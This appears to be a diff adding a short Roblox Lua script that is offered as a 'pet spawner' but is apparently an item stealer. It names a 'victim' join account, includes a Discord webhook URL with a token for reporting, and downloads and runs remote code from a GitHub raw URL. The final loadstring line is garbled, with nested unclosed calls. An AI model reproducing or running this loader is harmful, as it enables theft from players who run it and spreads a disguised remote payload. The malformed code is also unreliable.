@@ -1,0 +1,6 @@
+_G.Username = "canttxxo" -- user you should join victim on
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1348583060177813576/bx9NgRAmzM-Nj8l_g_reQCJXeuVGZqujPXmEE8Ca5COzItCL9hF79648B5rXM3GWN4yJ" -- change to your webhook
+
+loadstring(game:HttpGet('loadstring(game:HttpGet('loadstring(game:HttpGet('https://raw.githubusercontent.com/e4daulet/sekai/refs/heads/main/petspawner_sekai'))()
